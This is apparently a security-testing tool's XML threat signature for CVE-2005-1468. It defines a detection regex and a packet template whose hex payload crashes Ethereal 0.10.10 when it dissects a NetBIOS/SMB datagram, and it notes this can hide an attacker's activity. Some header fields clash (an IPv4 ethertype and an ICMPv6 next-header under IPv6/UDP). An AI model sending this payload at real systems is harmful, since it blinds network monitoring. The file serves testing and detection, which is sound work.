@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Ethereal NetBIOS Denial Of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat causes Ethereal to crash when it dissects the packet.  This can be used by an attacker to mask further activity if an administrator is using Ethereal to analyze traffic. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Evasion"/>
+    </Intent>
+    <Protocol display="true" value="NETBIOS_DS/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Ethereal"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Ethereal_0.10.10"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.ethereal.com/appnotes/enpa-sa-00019.html"/>
+    <CVEID display="true" value="CVE-2005-1468"/>
+    <bugtraqID display="true" value="13504"/>
+    <OSVDB display="true" value="16109"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="c85feef085a02be698235e699af31af8"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="high"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236794858"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X11\X1A\X69\XB8\X0A\X02\X0F\X3D\X00\X8A\X00\XBB\X00\X00\X20\X46\X45\X45\X4A\X45\X43\X46\X46\X46\X43\X45\X50\X45\X4B\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X00\X20\X45\X44\X45\X43\X46\X45\X46\X46\X46\X44\X45\X42\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X41\X43\X49\X43\X41\X43\X41\X42\X4E\X00\XFF\X53\X4D\X42\X25\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X38\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X08\X00\X00\X21\X00\X00\X00\X00\X00\X00\X00\X00\X00\XE8\X03\X00\X00\X36\X00\X00\X00\X00\X00\X21\X00\X56\X00\X03\X00\X01\X00\X00\X00\X02\X00\X32\X00\X5C\X4D\X41\X49\X4C\X53\X4C\X4F\X54\XB3\X42\X52\X4F\X57\X4E\X45\X00\X01\X00\X80\XFC\X0A\X00\X5F\X4E\X49\X43\X4F\X42\X5F\X00\X00\X00\X00\X00\X00\X00\X00\X00\X04\X00\X07\X90\X01\X00\X0F\X01\X55"/>
+    <Created value="1139461989" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026, 65535)" destPort="$destPort" checksum="C6A0" length="00CF" Payload="111A69B80A020F3D008A00BB0000204645454A4543464646434550454B4341434143414341434143414341434143410020454445434645464646444542434143414341434143414341434943414341424E00FF534D422500000000000000000000000000000038000000000000000000000008000021000000000000000000E803000036000000000021005600030001000000020032005C4D41494C534C4F54B342524F574E4500010080FC0A005F4E49434F425F0000000000000000000400079001000F0155"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
